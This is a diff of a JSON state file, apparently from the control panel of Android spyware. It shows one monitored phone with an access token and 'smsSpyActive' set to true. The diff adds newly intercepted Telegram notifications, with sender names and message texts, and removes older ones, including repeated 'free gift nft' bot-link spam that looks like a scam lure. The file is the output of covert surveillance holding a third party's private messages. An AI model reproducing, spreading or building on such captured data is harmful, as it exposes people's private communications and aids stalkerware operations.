@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775632380970,
+    "lastSeen": 1775632384062,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Alifzx rezz",
+        "content": "Tar",
+        "time": "08/04 14:13",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632385328
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "13 new messages from 12 chats",
+        "time": "08/04 14:13",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632385265
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Dana",
+        "time": "08/04 14:13",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632383790
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL BUYYER GOJO HARIAN: 𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
+        "content": "Send id tele lu",
+        "time": "08/04 14:13",
+        "pkg": "org.telegram.messenger.web",
+        "receivedAt": 1775632383778
+      },
       {
         "appName": "Telegram",
         "sender": "マ || !`𝙈𝙖𝙣𝙯𝙧𝙤𝙬𝙧 𝐓𝟓",
@@ -4294,38 +4326,6 @@
         "time": "08/04 13:32",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775629981094
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗩𝗮𝗻𝘇𝘇𝗼_𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹",
-        "content": "Keknya itu owner makanya banyak fitur",
-        "time": "08/04 13:32",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629981074
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "12 new messages from 9 chats",
-        "time": "08/04 13:32",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629980882
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
-        "content": "gass kan lagi free gift nft\nhttp://t.me/nft/PoolFloat-37532\n\ncara ikuti? \n- /start bot\n- share bot+channel\n- follow channel: https://t.me/BELIIIGIFTT\nhttps://t.me/MerchantTgGift\n\n\nshare kan bot:\n@appsPrermmm_bot\n@appremmshaca_bot",
-        "time": "08/04 13:32",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629953677
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
-        "content": "gass kan lagi free gift nft\nhttp://t.me/nft/PoolFloat-37532\n\ncara ikuti? \n- /start bot\n- share bot+channel\n- follow channel: https://t.me/BELIIIGIFTT\nhttps://t.me/MerchantTgGift\n\n\nshare kan bot:\n@appsPrermmm_bot\n@appremmshaca_bot",
-        "time": "08/04 13:32",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775629949863
       }
     ],
     "galleryPhotos": [],
